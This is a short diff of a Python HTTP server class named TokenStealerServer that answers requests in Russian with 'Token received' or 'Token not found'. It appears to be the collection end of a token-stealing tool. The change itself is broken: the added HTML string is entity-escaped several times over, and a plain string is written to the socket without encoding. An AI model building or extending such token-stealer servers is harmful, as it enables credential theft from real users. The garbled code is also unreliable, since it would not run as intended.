@@ -31,12 +31,12 @@ class TokenStealerServer(http.server.BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-type", "text/html; charset=utf-8")
             self.end_headers()
-            self.wfile.write("&amp;amp;lt;html&amp;amp;gt;&amp;amp;lt;body&amp;amp;gt;&amp;amp;lt;h1&amp;amp;gt;Токен получен&amp;amp;lt;/h1&amp;amp;gt;&amp;amp;lt;/body&amp;amp;gt;&amp;amp;lt;/html&amp;amp;gt;")
+            self.wfile.write("&amp;amp;amp;amp;lt;html&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;body&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;h1&amp;amp;amp;amp;gt;Токен получен&amp;amp;amp;amp;lt;/h1&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;/body&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;/html&amp;amp;amp;amp;gt;")
         else:
             self.send_response(404)
             self.send_header("Content-type", "text/plain; charset=utf-8")
             self.end_headers()
-            self.wfile.write("Токен не найден".encode('utf-8'))  # ✅ Исправлено: добавлен метод .encode('utf-8')
+            self.wfile.write("Токен не найден".encode('utf-8'))
 
 PORT = 8000
 with socketserver.TCPServer(("", PORT), TokenStealerServer) as httpd:
